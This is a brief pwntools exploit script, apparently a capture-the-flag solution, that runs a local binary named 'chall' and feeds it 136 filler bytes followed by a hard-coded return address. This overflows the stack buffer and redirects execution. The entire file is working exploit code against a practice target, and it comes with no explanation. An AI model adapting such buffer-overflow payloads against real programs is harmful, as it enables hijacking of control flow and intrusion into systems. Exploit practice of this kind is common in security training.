from pwn import process, log

p = process("./chall")

payload = 'A'*136
payload += '\x00\x00\x00\x00\x00\x40\x12\x09'[::-1]

p.clean()
p.sendline(payload)

log.info(p.clean())
